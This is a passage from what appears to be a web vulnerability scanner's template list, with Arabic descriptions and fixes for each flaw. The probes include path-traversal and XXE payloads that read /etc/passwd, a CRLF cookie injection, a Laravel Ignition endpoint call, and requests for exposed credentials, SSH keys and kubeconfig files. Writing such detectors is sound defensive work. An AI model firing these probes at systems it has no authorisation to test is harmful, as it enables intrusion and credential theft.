        "name": "Open URL Redirection Flaw",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "تطبيق الويب يعيد توجيه المستخدمين إلى روابط خارجية غير موثوقة بناءً على معاملات غير مفلترة، مما يسهل حملات التصيد الإلكتروني.",
        "remediation": "التحقق من صحة عناوين إعادة التوجيه وحصرها داخل النطاق نفسه أو استخدام قائمة بيضاء معتمدة.",
        "tags": ["redirect", "phishing", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?url=https://example.com", "{{BaseURL}}/?next=https://example.com", "{{BaseURL}}/?redirect=https://example.com"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["Location: https://example.com"]},
                {"type": "status", "status": [301, 302, 307, 308]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "path-traversal-detection.yaml",
        "id": "path-traversal-detection",
        "name": "Directory Path Traversal Vulnerability",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "إمكانية تجاوز مجلد العمل والوصول إلى ملفات خارج مسار الويب العام عبر محارف التراجع (../ أو ..\\).",
        "remediation": "تجريد محارف التراجع والتحقق من أن المسار النهائي يقع حصراً داخل المجلد الجذر المخصص للوثائق.",
        "tags": ["traversal", "lfi", "filesystem"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/static/..%2f..%2f..%2fetc/passwd", "{{BaseURL}}/assets/..%5c..%5c..%5cwindows/win.ini"],
            "matchers-condition": "or",
            "matchers": [
                {"type": "regex", "regex": ["root:.*:0:0:"]},
                {"type": "word", "words": ["[fonts]", "[extensions]"]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "crlf-header-injection.yaml",
        "id": "crlf-header-injection",
        "name": "CRLF HTTP Response Splitting Injection",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "حقن محارف نهاية السطر Carriage Return Line Feed في ترويسات الاستجابة يتيح التلاعب بترويسات الأمان أو تزييف ملفات تعريف الارتباط.",
        "remediation": "تجريد وإزالة محارف \\r و \\n من كافة المدخلات قبل كتابتها داخل ترويسات HTTP.",
        "tags": ["crlf", "headers", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/%0d%0aSet-Cookie:%20yemenscan_crlf=injected"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["Set-Cookie: yemenscan_crlf=injected"]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "xxe-xml-injection.yaml",
        "id": "xxe-xml-injection",
        "name": "XML External Entity (XXE) Injection Flaw",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "محلل ملفات XML يقوم بمعالجة الكيانات الخارجية، مما يتيح قراءة الملفات المحلية وإجراء طلبات داخلية (SSRF).",
        "remediation": "تعطيل معالجة الكيانات الخارجية (Disable DTD / External Entities) في جميع مكتبات معالجة XML.",
        "tags": ["xxe", "xml", "injection"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/xml", "{{BaseURL}}/api/xml"],
            "headers": {"Content-Type": "application/xml"},
            "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "matchers-condition": "and",
            "matchers": [
                {"type": "regex", "regex": ["root:.*:0:0:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "vulnerabilities",
        "file": "prototype-pollution-client.yaml",
        "id": "prototype-pollution-client",
        "name": "Client-Side Prototype Pollution Probe",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "تعديل النموذج الأولي Object.prototype عبر استعلامات الويب يتيح للمهاجمين التحكم بسلوك نصوص JavaScript وتنفيذ XSS.",
        "remediation": "تجميد النموذج الأولي (Object.freeze) أو استخدام خريطة Map بدلاً من الكائنات المفتوحة وتحديث مكتبات الواجهة الأمامية.",
        "tags": ["prototype-pollution", "javascript", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?__proto__[polluted]=true", "{{BaseURL}}/#__proto__[polluted]=true"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["__proto__", "polluted"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 3. EXPOSURES (14 Templates) - Source Code, Secrets & Database Dumps
    # =========================================================================
    {
        "category": "exposures",
        "file": "env-file-exposure.yaml",
        "id": "env-file-exposure",
        "name": "Environment Configuration File Exposure (.env)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "كشف ملف متغيرات البيئة .env في المجلد الجذر، مما يؤدي إلى تسريب كلمات مرور قواعد البيانات ومفاتيح API السرية والتشفير.",
        "remediation": "حظر الوصول لكافة الملفات التي تبدأ بنقطة في إعدادات خادم الويب ونقل ملف .env خارج المجلد العام.",
        "tags": ["exposure", "config", "env", "credentials", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.env", "{{BaseURL}}/.env.local", "{{BaseURL}}/.env.production"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["DB_PASSWORD=", "APP_KEY=", "DB_HOST="]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "database-dump-leak.yaml",
        "id": "database-dump-leak",
        "name": "Database Backup SQL Dump Exposure",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ملف تصدير قاعدة بيانات SQL مكشوف للعامة، مما يتيح تنزيل كافة سجلات المستخدمين والجداول الحساسة وبيانات النظام.",
        "remediation": "حذف ملفات النسخ الاحتياطي من مجلد الويب وتخزين النسخ الاحتياطية في خوادم تخزين سحابية آمنة ومحمية.",
        "tags": ["exposure", "database", "sql", "backup", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/dump.sql", "{{BaseURL}}/database.sql", "{{BaseURL}}/backup.sql", "{{BaseURL}}/db.sql"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["CREATE TABLE", "INSERT INTO"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "git-repository-exposure.yaml",
        "id": "git-repository-exposure",
        "name": "Git Repository Source Code Leak (.git/HEAD)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "مجلد مستودع Git متاح للعامة، مما يتيح للمهاجمين استخراج كامل الشفرة المصدرية للمشروع وتاريخ التعديلات والمفاتيح المخزنة.",
        "remediation": "حظر الوصول لمجلد .git بشكل دائم في خادم الويب (مثل location ~ /\\.git { deny all; }).",
        "tags": ["exposure", "git", "source-code", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.git/HEAD"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["ref: refs/heads/"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "git-config-exposure.yaml",
        "id": "git-config-exposure",
        "name": "Git Repository Configuration File Disclosure (.git/config)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "ملف تكوين Git مكشوف، مما يكشف عن روابط المستودعات الخاصة وأسماء المطورين ورموز المصادقة المحتملة.",
        "remediation": "حظر الوصول لكافة ملفات ومجلدات نظام التحكم بالإصدارات Git من خادم الويب.",
        "tags": ["exposure", "git", "config"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.git/config"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["[core]", "repositoryformatversion"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "svn-repository-exposure.yaml",
        "id": "svn-repository-exposure",
        "name": "Subversion Repository Disclosure (.svn/entries)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "كشف مجلد مستودع Subversion مما يسمح بسحب ملفات المشروع والشفرات المصدرية السابقة.",
        "remediation": "حظر الوصول لمجلدات وملفات .svn في إعدادات خادم الويب.",
        "tags": ["exposure", "svn", "source-code"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.svn/entries", "{{BaseURL}}/.svn/wc.db"],
            "matchers-condition": "or",
            "matchers": [
                {"type": "word", "words": ["svn:special", "SQLite format 3"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "backup-files-exposure.yaml",
        "id": "backup-files-exposure",
        "name": "Web Application Compressed Backup Archive Leak",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "ملفات أرشيف مضغوطة تحوي نسخاً احتياطية كاملة من موقع الويب متاحة للتحميل العام بدون قيود.",
        "remediation": "إزالة ملفات الأرشيف (zip, tar.gz, rar) من مسارات الويب العامة فوراً.",
        "tags": ["exposure", "backup", "archive"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/backup.zip", "{{BaseURL}}/site.zip", "{{BaseURL}}/backup.tar.gz", "{{BaseURL}}/www.zip"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["application/zip", "application/x-gzip", "application/octet-stream"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "docker-compose-exposure.yaml",
        "id": "docker-compose-exposure",
        "name": "Docker Compose Configuration Disclosure",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "كشف ملف docker-compose.yml يعرض بنية الحاويات الداخلية وشبكات الخدمات وكلمات مرور الحاويات.",
        "remediation": "نقل ملفات نشر الحاويات خارج مجلد خدمة الويب وحظر الوصول لملفات YAML العامة.",
        "tags": ["exposure", "docker", "devops"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/docker-compose.yml", "{{BaseURL}}/docker-compose.yaml"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["version:", "services:", "image:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "aws-credentials-exposure.yaml",
        "id": "aws-credentials-exposure",
        "name": "AWS Cloud Credentials & Config File Leak",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "تسريب ملف بيانات الاعتماد السحابية لأمازون .aws/credentials مما يتيح للمهاجم الاستيلاء على موارد السحابة.",
        "remediation": "حظر الوصول لمجلد .aws وإلغاء وتدوير كافة مفاتيح الوصول لـ AWS فوراً.",
        "tags": ["exposure", "aws", "cloud", "credentials", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.aws/credentials", "{{BaseURL}}/.aws/config"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["aws_access_key_id", "aws_secret_access_key"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "ssh-private-key-leak.yaml",
        "id": "ssh-private-key-leak",
        "name": "SSH Private Key File Disclosure (id_rsa)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ملف المفتاح الخاص لاتصال SSH مكشوف للعامة، مما يتيح تسجيل الدخول المباشر إلى خادم النظام والتحكم به.",
        "remediation": "حذف المفتاح من مجلد الخادم وتغيير المفتاح الخاص المعتمد وإلغاء تصريحه من authorized_keys.",
        "tags": ["exposure", "ssh", "keys", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/id_rsa", "{{BaseURL}}/.ssh/id_rsa"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "kubeconfig-exposure.yaml",
        "id": "kubeconfig-exposure",
        "name": "Kubernetes Cluster Configuration File Exposure",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ملف إعدادات كتلة Kubernetes متاح للعامة (.kube/config) متضمناً شهادات الوصول الإداري لعناقيد الحاويات.",
        "remediation": "حذف ملف الإعداد وحظر مجلد .kube وتجديد شهادات المصادقة الخاصة بمجموعات K8s.",
        "tags": ["exposure", "k8s", "kubernetes", "cloud", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.kube/config", "{{BaseURL}}/kubeconfig"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["apiVersion: v1", "clusters:", "certificate-authority-data"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "terraform-vars-exposure.yaml",
        "id": "terraform-vars-exposure",
        "name": "Terraform State & Secret Variables Disclosure",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "تسريب ملفات البنية التحتية كرموز Terraform (terraform.tfvars أو .tfstate) يكشف كلمات المرور وبنية الشبكات السحابية.",
        "remediation": "إزالة ملفات الحالة من مجلدات الويب وتخزينها في مساحات تخزين بعيدة مشفرة مع تفعيل التدوير.",
        "tags": ["exposure", "terraform", "devops"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/terraform.tfvars", "{{BaseURL}}/terraform.tfstate"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["terraform_version", "resources", "serial"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "heapdump-memory-leak.yaml",
        "id": "heapdump-memory-leak",
        "name": "Java Heapdump / Core Memory Dump Exposure",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "ملف تفريغ ذاكرة الخادم heapdump مكشوف، مما يتيح استخراج الجلسات النشطة والمفاتيح السرية من الذاكرة العشوائية.",
        "remediation": "حظر تنزيل ملفات .hprof و .dump ونقلها خارج بيئة التشغيل للتحليل بأمان.",
        "tags": ["exposure", "heapdump", "memory", "java"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/heapdump", "{{BaseURL}}/dump.hprof"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["JAVA PROFILE 1.0", "HPROF"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "phpmyadmin-panel.yaml",
        "id": "phpmyadmin-panel",
        "name": "phpMyAdmin Database Management Panel Exposure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "لوحة إدارة قواعد البيانات phpMyAdmin متاحة للوصول العام، مما يجعلها هدفاً لهجمات التخمين ومحاولات الاستغلال.",
        "remediation": "تقييد الوصول للوحة phpMyAdmin عبر الشبكة الخاصة VPN أو حصرها بعناوين IP موثوقة وتغيير مسار الوصول الافتراضي.",
        "tags": ["exposure", "phpmyadmin", "mysql", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/phpmyadmin/", "{{BaseURL}}/pma/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["phpMyAdmin", "pma_username"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "exposures",
        "file": "sitemap-admin-disclosure.yaml",
        "id": "sitemap-admin-disclosure",
        "name": "Sitemap & Sensitive Administrative Endpoints Disclosure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "كشف ملفات خرائط الموقع التي تفصح عن مسارات إدارية حساسة وبوابات تحكم داخلية.",
        "remediation": "مراجعة خريطة الموقع sitemap.xml والتأكد من عدم احتوائها على مسارات إدارية أو تجريبية حساسة.",
        "tags": ["exposure", "sitemap", "information-disclosure", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/sitemap.xml", "{{BaseURL}}/sitemap_index.xml"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["<urlset", "<loc>"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 4. API (8 Templates) - Modern API & Microservices Flaws
    # =========================================================================
    {
        "category": "api",
        "file": "springboot-actuator-exposed.yaml",
        "id": "springboot-actuator-exposed",
        "name": "Spring Boot Actuator Endpoints Exposure",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "نقاط نهاية Spring Boot Actuator متاحة للعامة، مما يكشف عن حالة الخادم والمقاييس والبيئة الداخلية.",
        "remediation": "تعطيل أو تقييد مسارات actuator عبر ضبط management.endpoints.web.exposure.include=health فقط وتفعيل المصادقة الإجبارية.",
        "tags": ["api", "spring", "actuator", "java"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/actuator", "{{BaseURL}}/actuator/env", "{{BaseURL}}/actuator/mappings"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["_links", "/actuator/health", "propertySources"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "springboot-actuator-heapdump.yaml",
        "id": "springboot-actuator-heapdump",
        "name": "Spring Boot Actuator Heapdump Memory Leak",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "نقطة تفريغ الذاكرة /actuator/heapdump متاحة بدون مصادقة، مما يتيح تنزيل ذاكرة تطبيق Java بالكامل واستخراج الجلسات والمفاتيح.",
        "remediation": "إلغاء تفعيل نقطة نهاية heapdump في ملف application.properties أو فرض مصادقة Spring Security.",
        "tags": ["api", "spring", "actuator", "heapdump"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/actuator/heapdump"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["application/octet-stream", "gzip"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "graphql-introspection.yaml",
        "id": "graphql-introspection",
        "name": "GraphQL API Introspection Query Enabled",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "استعلامات الاستبطان Introspection مفعلة في واجهة GraphQL، مما يتيح للمهاجمين استعراض كامل مخطط البيانات والأنواع والاستعلامات المخفية.",
        "remediation": "تعطيل ميزة Introspection في بيئات الإنتاج الفعلية.",
        "tags": ["api", "graphql", "introspection", "medium"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/graphql", "{{BaseURL}}/api/graphql"],
            "headers": {"Content-Type": "application/json"},
            "body": "{\"query\":\"query { __schema { types { name } } }\"}",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["__schema", "types", "queryType"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "graphql-console-exposed.yaml",
        "id": "graphql-console-exposed",
        "name": "GraphQL Playground & GraphiQL Console Disclosure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "لوحة الاختبار التفاعلية GraphiQL / Playground مكشوفة للعامة، مما يسهل بناء وتنفيذ استعلامات هجومية على واجهة البيانات.",
        "remediation": "تعطيل لوحات التطوير التفاعلية في خوادم الإنتاج وحصرها في بيئات التطوير المحلية.",
        "tags": ["api", "graphql", "console", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/graphql", "{{BaseURL}}/graphiql", "{{BaseURL}}/playground"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["GraphQLPlayground", "GraphiQL", "graphql-playground-html"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "swagger-api-disclosure.yaml",
        "id": "swagger-api-disclosure",
        "name": "Swagger & OpenAPI Schema Definition Disclosure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "مخطط واجهات برمجة التطبيقات Swagger/OpenAPI متاح للعامة، مما يسهل للمهاجم معرفة نقاط النهاية الداخلية والمعاملات ونماذج البيانات.",
        "remediation": "تقييد الوصول لملفات ومسارات swagger.json و openapi.json بالمستخدمين المصرح لهم.",
        "tags": ["api", "swagger", "openapi", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/swagger.json", "{{BaseURL}}/openapi.json", "{{BaseURL}}/v2/api-docs", "{{BaseURL}}/v3/api-docs"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["swagger\":", "openapi\":", "paths\":"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "swagger-ui-explorer.yaml",
        "id": "swagger-ui-explorer",
        "name": "Swagger UI Interactive API Explorer Exposed",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "واجهة Swagger UI التفاعلية متاحة دون مصادقة، مما يتيح تجربة الاستدعاءات واستكشاف واجهات البرمجة بسهولة.",
        "remediation": "تعطيل واجهة Swagger UI في بيئة الإنتاج أو حمايتها بنظام مصادقة قوي.",
        "tags": ["api", "swagger", "explorer", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/swagger-ui.html", "{{BaseURL}}/swagger/index.html", "{{BaseURL}}/docs/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["swagger-ui", "Swagger UI", "swagger-section"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "prometheus-metrics-disclosure.yaml",
        "id": "prometheus-metrics-disclosure",
        "name": "Prometheus Metrics & Operational Telemetry Leak",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "نقطة مقاييس المراقبة /metrics مكشوفة بدون مصادقة، مما يفصح عن تفاصيل استخدام الذاكرة وأسماء الخوادم والأداء الداخلي.",
        "remediation": "حظر الوصول لمسار /metrics وحصره بخادم المراقبة الداخلي أو تفعيل المصادقة الأساسية المتبادلة.",
        "tags": ["api", "metrics", "prometheus", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/metrics", "{{BaseURL}}/actuator/prometheus"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["# HELP", "# TYPE", "http_requests_total"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "api",
        "file": "api-mass-assignment-leak.yaml",
        "id": "api-mass-assignment-leak",
        "name": "REST API Sensitive Object & Mass Assignment Exposure",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "واجهة API تعيد بيانات المستخدمين الحساسة (مثل isAdmin, role, password_hash) مما يمهد لهجمات Mass Assignment.",
        "remediation": "تطبيق نمط DTO وتحديد الحقول المسموح بقراءتها وكتابتها بشكل صريح ومنع تصدير حقول الصلاحيات.",
        "tags": ["api", "mass-assignment", "owasp-api"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/api/v1/users", "{{BaseURL}}/api/users/me"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["\"isAdmin\":", "\"role\":", "\"password_hash\":"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 5. WORDPRESS (6 Templates) - WordPress CMS Vulnerabilities
    # =========================================================================
    {
        "category": "wordpress",
        "file": "wp-config-backup.yaml",
        "id": "wp-config-backup",
        "name": "WordPress Database Configuration Backup Leak (wp-config.php.bak)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "نسخة احتياطية من ملف wp-config مكشوفة، مما يكشف بيانات الاتصال بقاعدة بيانات ووردبريس ومفاتيح التمليح السرية.",
        "remediation": "حذف كافة ملفات النسخ الاحتياطية لـ wp-config من مجلد الخادم وتغيير كلمات مرور قاعدة البيانات ومفاتيح WordPress Salts.",
        "tags": ["wordpress", "config", "backup", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/wp-config.php.bak", "{{BaseURL}}/wp-config.php.save", "{{BaseURL}}/wp-config.php.swp", "{{BaseURL}}/wp-config.old"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["DB_PASSWORD", "DB_USER", "AUTH_KEY"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "wordpress",
        "file": "wp-debug-log.yaml",
        "id": "wp-debug-log",
        "name": "WordPress Debug Log Sensitive Error Leak (debug.log)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "ملف سجل الأخطاء wp-content/debug.log متاح للتحميل العام، مما يكشف عن استعلامات SQL وأخطاء الإضافات والمسارات الحساسة.",
        "remediation": "تعطيل WP_DEBUG_LOG في wp-config.php أو حظر الوصول لملفات .log من خادم الويب.",
        "tags": ["wordpress", "logs", "debug"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/wp-content/debug.log"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["PHP Fatal error", "PHP Notice", "WordPress database error"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "wordpress",
        "file": "wp-user-enumeration.yaml",
        "id": "wp-user-enumeration",
        "name": "WordPress REST API User Enumeration",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "واجهة برمجة تطبيقات ووردبريس تسمح بسرد أسماء حسابات المستخدمين والمدراء عبر نقطة /wp-json/wp/v2/users.",
        "remediation": "تقييد الوصول لواجهة المستخدمين في REST API للمستخدمين المصادق عليهم فقط.",
        "tags": ["wordpress", "recon", "users", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/wp-json/wp/v2/users"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["\"slug\":", "\"avatar_urls\":", "\"id\":"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "wordpress",
        "file": "wp-elementor-upload-rce.yaml",
        "id": "wp-elementor-upload-rce",
        "name": "WordPress Elementor Plugin Arbitrary Upload & RCE",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة في إضافة Elementor تسمح برفع ملفات برمجية ضارة وتنفيذ أوامر RCE دون تدقيق كافٍ لنوع الملفات.",
        "remediation": "ترقية ملحق Elementor فوراً إلى أحدث إصدار متاح وسد ثغرات معالجة الرفع.",
        "tags": ["wordpress", "elementor", "rce", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/wp-content/plugins/elementor/readme.txt"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Elementor Website Builder", "Stable tag: 3."]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "wordpress",
        "file": "wp-file-manager-rce.yaml",
        "id": "wp-file-manager-rce",
        "name": "WordPress File Manager Plugin RCE (CVE-2020-25213)",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة في مكتبة elFinder المدمجة مع إضافة WP File Manager تتيح تنفيذ أوامر برمجية ورفع ملفات Webshell بدون مصادقة.",
        "remediation": "ترقية إضافة WP File Manager إلى الإصدار 6.9 أو أعلى وحذف ملفات موصل elFinder غير المحمية.",
        "tags": ["wordpress", "wp-plugin", "rce", "cve2020", "critical"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"],
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "cmd=upload",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["errUnknownCmd", "elFinder"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "wordpress",
        "file": "wp-xmlrpc-multicall.yaml",
        "id": "wp-xmlrpc-multicall",
        "name": "WordPress XML-RPC System Multicall Brute-Force Exposure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "نقطة xmlrpc.php مفعلة وتدعم استدعاءات system.multicall، مما يتيح شن هجمات تخمين كلمات المرور بسرعة فائقة وتجاوز حدود الطلبات.",
        "remediation": "تعطيل XML-RPC عبر خادم الويب أو استخدام إضافات الحماية لحظر طلبات xmlrpc.php.",
        "tags": ["wordpress", "xmlrpc", "bruteforce", "medium"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/xmlrpc.php"],
            "headers": {"Content-Type": "text/xml"},
            "body": "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["<methodResponse>", "system.multicall"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 6. PHP (6 Templates) - PHP & Modern Framework Vulnerabilities
    # =========================================================================
    {
        "category": "php",
        "file": "laravel-debug-mode.yaml",
        "id": "laravel-debug-mode",
        "name": "Laravel Ignition Remote Debug Mode Active",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "واجهة التصحيح Laravel Ignition مفعلة في بيئة الإنتاج، مما يتيح استعراض مفاتيح التشفير وتنفيذ شفرات برمجية عن بعد.",
        "remediation": "تعطيل وضع التصحيح وضبط APP_DEBUG=false في ملف .env الخاص بتطبيق Laravel.",
        "tags": ["php", "laravel", "ignition", "debug", "critical"],
        "http": [{
            "method": "POST",
            "path": ["{{BaseURL}}/_ignition/execute-solution"],
            "headers": {"Content-Type": "application/json"},
            "body": "{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\"}",
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Ignition", "Laravel", "viewData"]},
                {"type": "status", "status": [200, 500]}
            ]
        }]
    },
    {
        "category": "php",
        "file": "laravel-log-leak.yaml",
        "id": "laravel-log-leak",
        "name": "Laravel Application Execution Log Leak (laravel.log)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "ملف سجلات Laravel متاح للتنزيل المباشر، متضمناً أخطاء التطبيق والاستعلامات وبيانات الاعتماد الحساسة.",
        "remediation": "منع الوصول لمجلد storage وحظر تنزيل ملفات .log في خادم الويب.",
        "tags": ["php", "laravel", "logs"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/storage/logs/laravel.log"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": [".INFO: ", ".ERROR: ", "production.ERROR"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "php",
        "file": "phpinfo-disclosure.yaml",
        "id": "phpinfo-disclosure",
        "name": "PHP Information Disclosure Page (phpinfo)",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "صفحة معلومات تكوين PHP مكشوفة (phpinfo)، مما يفصح عن مسارات النظام والمتغيرات وإصدارات الإضافات وخيارات الأمان.",
